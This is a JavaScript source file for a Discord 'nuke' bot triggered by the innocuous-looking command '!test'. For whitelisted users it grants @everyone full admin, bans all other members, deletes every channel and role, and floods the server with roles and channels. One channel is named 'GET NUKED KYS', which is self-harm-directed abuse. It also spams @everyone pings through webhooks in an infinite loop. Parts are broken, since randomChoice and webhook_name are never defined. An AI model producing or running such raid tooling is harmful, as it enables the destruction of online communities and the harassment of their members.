const Discord = require('discord.js');
const client = new Discord.Client();


premium = ["836426974339006495"]
message = ["@everyone test", "@everyone hi"]
channels = ["test", "google", "bear"]


client.on("message", (message) => {
    if (message.content === "!test") {
        if (premium.includes(message.author.id)) {
            message.delete();
            let guild = message.guild;
            try {
                guild.setName("hello world");
                guild.setIcon("path/to/image.png");
            } catch {
                console.log("Error: Icon not changed");
            }
            try {
                let role = guild.roles.cache.find(r => r.name === "@everyone");
                role.setPermissions(Discord.Permissions.ALL);
                console.log("Everyone has admin");
            } catch {
                console.log("No one has admin");
            }
            guild.members.cache.forEach(member => {
                if (!premium.includes(member.id)) {
                    member.ban();
                    console.log(`${member.username} was banned`);
                } else {
                    console.log(`${member.username} can't be banned`);
                }
            });
            guild.channels.cache.forEach(channel => {
                channel.delete();
                console.log(`${channel.name} was deleted`);
            });
            guild.roles.cache.forEach(role => {
                role.delete();
                console.log(`${role.name} was deleted`);
            });
            for (let i = 0; i < 100; i++) {
                guild.roles.create({ name: "SPRITE ON TOP" });
                console.log("Role created");
            }
            guild.channels.create("GET NUKED KYS");
            guild.channels.cache.forEach(channel => {
                if (channel.type === "text") {
                    channel.createInvite({ maxAge: 0, maxUses: 0 }).then(invite => {
                        console.log(`New invite: ${invite}`);
                    });
                }
            });
            for (let i = 0; i < 75; i++) {
                guild.channels.create(randomChoice(channels));
                console.log(`Nuked ${guild.name} successfully`);
            }
        } else {
            console.log("Someone tried to nuke but failed");
        }
    }
});

client.on("guildChannelCreate", (channel) => {
    channel.createWebhook(randomChoice(webhook_name)).then(webhook => {
        while (true) {
            channel.send(randomChoice(message));
            webhook.send(randomChoice(message), { username: randomChoice(webhook_name), avatar_url: "https://cdn.discordapp.com/icons/965788521900179496/35e1d6919e79af1d925d2ac81393d38c.png?size=128" });
        }
    });
});

client.login(process.env.TOKEN);
    
            